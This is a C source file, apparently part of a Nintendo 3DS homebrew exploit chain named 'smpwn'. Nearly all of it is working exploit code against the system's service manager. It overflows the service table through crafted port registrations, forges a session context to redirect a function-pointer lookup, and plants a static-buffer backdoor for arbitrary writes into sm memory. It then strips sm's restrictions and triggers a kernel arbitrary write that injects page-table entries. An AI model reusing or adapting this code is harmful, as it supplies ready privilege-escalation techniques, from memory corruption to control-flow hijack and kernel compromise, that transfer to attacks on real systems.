#include "smpwn.h"
#include "lib/srv.h"
#include "lib/MyThread.h"

#define SMPWN_VICTIM_SERVICE_NAME           "pxi:dev"
#define SMPWN_VICTIM_SERVICE_MAX_SESSIONS   2
#define SMPWN_THREAD_STACK_SIZE             0x80

typedef struct SmConstants {
    u32 tlsAddr;
    // fakeSessionCtxLoc CANNOT be on TLS since the MSByte is non-zero and it'll clear the 5th byte...
    u32 staticBuffer0Addr;
    u32 serviceHandlerTableAddr;
    u32 managerAddr;
    u32 serviceManager;
    u32 cmdReplayInfoManager;
    u32 jumpAddr;
    u32 jumpAddr2;
    u32 nbSrvPmSessionsAddr;
    u32 nbKipsAddr;
} SmConstants;

static const SmConstants s_constants = {
    .tlsAddr                    = 0x1FF85000,
    .staticBuffer0Addr          = 0x10ADFC,
    .serviceHandlerTableAddr    = 0x105014,
    .managerAddr                = 0x106C80,
    .serviceManager             = 0x109F6C,
    .cmdReplayInfoManager       = 0x10ABF4,
    .jumpAddr                   = 0x102444,
    .jumpAddr2                  = 0x10021C,
    .nbSrvPmSessionsAddr        = 0x106000,
    .nbKipsAddr                 = 0x106C9C,
};

// Some SM structures definitions
struct SessionContext;
typedef struct SessionContextServiceInfo {
    Handle handle;
    u32 handlerIndex;
    struct SessionContext *parent;
    u32 replayCmdbuf[5];
} SessionContextServiceInfo;

typedef struct SessionContext {
    void *manager;
    u32 pid;
    SessionContextServiceInfo serviceInfo;
} SessionContext;

typedef struct ServiceData {
    u32 pid; // PID of the registrant
    Handle clientPort; // can actually be any kind of handle with "Port" function
    char name[8];
    bool isNamedPort; // see above
} ServiceData;

typedef struct ServiceDataManager {
    u16 currentNb;
    u16 padding[3];
    ServiceData services[160];
} ServiceDataManager;

struct SmpwnContext {
    Handle srvHandle;
    u32 dummyStringBytes;
    Handle depletionArray[SMPWN_VICTIM_SERVICE_MAX_SESSIONS];
    u32 nbDepletionHandles;
    Handle waiterThreadWokeUpEvent;
    u16 initialServiceCount;
    u8 delayedWaiterThreadStack[SMPWN_THREAD_STACK_SIZE];
};

/*
See writeup.

PRECONDITION: byte 1 < n < 3 of a is 0 and all other bytes before are non-zero.
handlerId violates that precondition but that's not much of a problem since it's then left shifted by two bits.

POSTCONDITION: a,b is registered as the service name.
*/

/**
 * @brief Write 8 nearly-arbitrary bytes in the service table (+ overflown data); refer to writeup.
 * @param ctx Context.
 * @param a First word to write.
 * @param b Second word to write.
 * @pre byte 1 < n < 3 of a is 0 and all other bytes before are non-zero.
 * @pre If one byte of b is zero, then more significant bytes must be 0.
 */
static Result smWrite8(SmpwnContext *ctx, u32 a, u32 b)
{
    Handle h = ctx->srvHandle; // any valid handle is fine here
    char fakeServiceName[8];
    Result res;

    if (b != 0) {
        memcpy(fakeServiceName, &ctx->dummyStringBytes, 4);
        memcpy(fakeServiceName + 4, &b, 4);
        TRY(srvRegisterPort(h, fakeServiceName, h));
        TRY(srvUnregisterPort(h, fakeServiceName));
    }

    ctx->dummyStringBytes += 0x10;

    memset(fakeServiceName, 0, 8);
    memcpy(fakeServiceName, &a, 4);
    return srvRegisterPort(h, fakeServiceName, h);
}

/**
 * @brief Writes data to the specified static buffer.
 * @param ctx Context.
 * @param data Data to write.
 * @param size Size of the data to write.
 * @param slot Static buffer slot ID (0-15).
 */
static Result smWriteStaticBufferData(const SmpwnContext *ctx, const void *data, size_t size, u32 slot)
{
    u32* cmdbuf = getThreadCommandBuffer();
    cmdbuf[0] = IPC_MakeHeader(0x1337,1,2);
    cmdbuf[1] = 0xDEADBEEF;
    cmdbuf[2] = IPC_Desc_StaticBuffer(size, slot);
    cmdbuf[3] = (u32)data;
    return svcSendSyncRequest(ctx->srvHandle);
}

static void smpwnDelayedWaiterThreadTask(SmpwnContext *ctx)
{
    Handle h;

    svcConnectToPort(&h, "srv:"); // Get another session
    u32* cmdbuf = getThreadCommandBuffer();

    cmdbuf[0] = IPC_MakeHeader(0x1,0,2); // RegisterClient 0x10002
    cmdbuf[1] = IPC_Desc_CurProcessId();
    svcSendSyncRequest(h);

    for (;;) {
        cmdbuf[0] = IPC_MakeHeader(0x5,0x3F,0); // GetPort 0x50100 GetServiceHandle modified
        strncpy((char*) &cmdbuf[1], SMPWN_VICTIM_SERVICE_NAME,8);
        cmdbuf[3] = strnlen(SMPWN_VICTIM_SERVICE_NAME, 8);
        cmdbuf[4] = 0; // Blocking
        svcSendSyncRequest(h);
        ctx->depletionArray[ctx->nbDepletionHandles++] = cmdbuf[3];
        svcSignalEvent(ctx->waiterThreadWokeUpEvent);
    }
}

static void smpwnDelayedWaiterThread(void *p)
{
    SmpwnContext *ctx = (SmpwnContext *)p;
    smpwnDelayedWaiterThreadTask(ctx);

    // Due to the exploit this thread should never resume
    for (;;) svcSleepThread(100 * 1000 * 1000 * 1000LL);
}

Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
{
    Result res = 0;
    u16 numRegistered;

    memset(ctx, 0, sizeof(SmpwnContext));
    TRY(svcCreateEvent(&ctx->waiterThreadWokeUpEvent, RESET_ONESHOT));
    TRY(srvInit(&ctx->srvHandle));
    ctx->dummyStringBytes = 0xC0CCC00C;

    // Wait a bit -- pm might be garbage collecting processes and unregistering services
    svcSleepThread(60 * 1000 * 1000LL);

    // Setting up the data
    // We basically set up a static buffer pointing... to the static buffer descriptor area itself!

    // NOTE: fakeSessionCtxLoc CANNOT be on TLS since the MSByte is non-zero and it'll clear the 5th byte...
    u32 fakeSessionCtxLoc = s_constants.staticBuffer0Addr;
    u32 staticBufsAddr = s_constants.tlsAddr + 0x180;
    u32 jumpAddrLoc = fakeSessionCtxLoc + 0x14 + 2*4; // &c.serviceInfo.replayCmdbuf[2]
    u32 handlerId = (u32)((s32)(jumpAddrLoc - s_constants.serviceHandlerTableAddr)) >> 2;

    SessionContext c = {
        .manager = (void *)s_constants.managerAddr, // doesn't really matter
        .pid = 0,                                       // doesn't really matter either
        .serviceInfo = {
            .handle = 0,                                // r4
            .handlerIndex = handlerId,                  // r9 - Funcptr table index
            .parent = (SessionContext *)staticBufsAddr, // r0 - Value, should have been &c in a normal situation
            .replayCmdbuf = {
                staticBufsAddr + 4,                     // r2 - Address
                0,                                      // r3
                s_constants.jumpAddr,               // overriden r4 - We'll use it for temporary storage
                0,                                      // overriden r9
                s_constants.jumpAddr2,              // r12 - Second address to jump to
            },
        },
    };

    // Make one session wait forever for a service session handle
    MyThread t;
    TRY(MyThread_Create(&t, smpwnDelayedWaiterThread, ctx, ctx->delayedWaiterThreadStack, SMPWN_THREAD_STACK_SIZE, 0x18, -2));
    TRY_ALL(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, 25 * 1000 * 1000LL));
    svcSleepThread(10 * 1000 * 1000LL);

    // Set up the data at the static buffer 0 address (7.0+: 0x10ADFC)
    TRY(smWriteStaticBufferData(ctx, &c, sizeof(c), 0));

    // Here service = "port"/registered handle, they share the same overflown table
    // We need to fill the table to the max, then write fakeSessionCtxLoc, but we don't know
    // how many services there currently is. Therefore we'll write fakeSessionCtxLoc, see if the waiter thread wakes
    // up, if not we don't need to fill any more entries.

    // We'll be overflowing into CmdRetryManager
    // PID overflowed by our own, padding by the handle (translated), sessionCtx and info is <we don't care>

    svcClearEvent(ctx->waiterThreadWokeUpEvent);
    for (numRegistered = 0; ; numRegistered++) {
        svcSleepThread(1 * 1000 * 1000LL); // Give time for our replay info makes it to the top.
        TRY(smWrite8(ctx, fakeSessionCtxLoc, 0));

        // Try to wake up the thread
        Handle h = ctx->depletionArray[--ctx->nbDepletionHandles];
        ctx->depletionArray[ctx->nbDepletionHandles] = 0;
        svcCloseHandle(h);
        // timeout value too low/too high => more unstable; don't return on timeout
        TRY(svcWaitSynchronization(ctx->waiterThreadWokeUpEvent, 25 * 1000 * 1000LL));

        if (res == 0) {
            // It woke up = no overflow.
            u32 nam = fakeSessionCtxLoc;
            char name[8] = {0};
            memcpy(name, &nam, 4);
            TRY(srvUnregisterPort(ctx->srvHandle, name));
            TRY(smWrite8(ctx, 1 + numRegistered, 0));
        } else {
            // Overflow -- thread will never resume again.
            // This is because we overwrote the cmd replay entry and sm can't find it.
            break;
        }
    }

    res = 0;
    ctx->initialServiceCount = 0xA1 - numRegistered;

    while (ctx->nbDepletionHandles-- > 0) {
        svcCloseHandle(ctx->depletionArray[ctx->nbDepletionHandles]);
        ctx->depletionArray[ctx->nbDepletionHandles] = 0;
    }
    svcSleepThread(10 * 1000 * 1000LL);

    // Seems like cleaning up by unregistering ports makes sm crash, so let's not do it.

    // At this point nothing can fail anymore.
    // Quickly put the static bufs into a sane state.
    // Also prepare LazyPixie buffers for < 11.12.
    u32 staticBufs[16*2] = {
        IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
        s_constants.staticBuffer0Addr,

        IPC_Desc_StaticBuffer(16*8, 1),
        staticBufsAddr, // our backdoor

        IPC_Desc_StaticBuffer(0, 2),
        0, // empty

        // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly),
        // to map MAP_ADDR.
        // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash

        IPC_Desc_StaticBuffer(0, 3),
        KERNPA2VA(0x1FFF8000) + (KHC3DS_MAP_ADDR >> 20) * 4,

        IPC_Desc_StaticBuffer(0, 4),
        KERNPA2VA(0x1FFFC000) + (KHC3DS_MAP_ADDR >> 20) * 4,

        IPC_Desc_StaticBuffer(0, 5),
        KERNPA2VA(0x1F3F8000) + (KHC3DS_MAP_ADDR >> 20) * 4,

        IPC_Desc_StaticBuffer(0, 6),
        KERNPA2VA(0x1F3FC000) + (KHC3DS_MAP_ADDR >> 20) * 4,
    };

    smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 0);

    svcCloseHandle(ctx->waiterThreadWokeUpEvent);

    *outSrvHandle = ctx->srvHandle;
    return res;
}

u32 smGetInitialServiceCount(const SmpwnContext *ctx)
{
    return ctx->initialServiceCount;
}

Result smWriteData(const SmpwnContext *ctx, u32 smDst, const void *src, size_t size)
{
    Result res = 0;
    u32 staticBufs[16*2] = {
        IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
        s_constants.staticBuffer0Addr,
        IPC_Desc_StaticBuffer(16*8, 1),
        s_constants.tlsAddr + 0x180, // our backdoor
        IPC_Desc_StaticBuffer(size, 2),
        smDst,
        // LazyPixie staticbufs not overwritten
    };

    TRY(smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 1));
    TRY(smWriteStaticBufferData(ctx, src, size, 2));

    return res;
}

Result smPartiallyCleanupSmpwn(const SmpwnContext *ctx)
{
    Result res = 0;
    u16 nbReplayEntries = 0;
    TRY(smWriteData(ctx, s_constants.serviceManager + 0, &ctx->initialServiceCount, 2)); // u16@0 = number of services
    TRY(smWriteData(ctx, s_constants.cmdReplayInfoManager + 0, &nbReplayEntries, 2)); // u16@0 = number of entries
    return res;
}

Result smRemoveRestrictions(const SmpwnContext *ctx)
{
    Result res = 0;
    s32 nbSrvPmSessions = INT_MIN;
    s16 nbKips = SHRT_MIN;

    TRY(smWriteData(ctx, s_constants.nbSrvPmSessionsAddr, &nbSrvPmSessions, 4));
    TRY(smWriteData(ctx, s_constants.nbKipsAddr, &nbKips, 2));

    return res;
}

Result smMapL2TableViaLazyPixie(const SmpwnContext *ctx, const BlobLayout *layout)
{
    Result res = 0;
    u32 *cmdbuf = getThreadCommandBuffer();
    u32 baseSbufId = 3;

    // We assume our static buffers descriptors have already been injected
    // Trigger the kernel arbwrite
    u32 numCores = IS_N3DS ? 4 : 2;
    cmdbuf[0] = IPC_MakeHeader(0xCAFE, 0, 2 * numCores);
    for (u32 i = 0; i < numCores; i++) {
        cmdbuf[1 + 2 * i]       = IPC_Desc_PXIBuffer(4, baseSbufId + i, false);
        cmdbuf[1 + 2 * i + 1]   = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
    }

    TRY(svcSendSyncRequest(ctx->srvHandle));

    return res;
}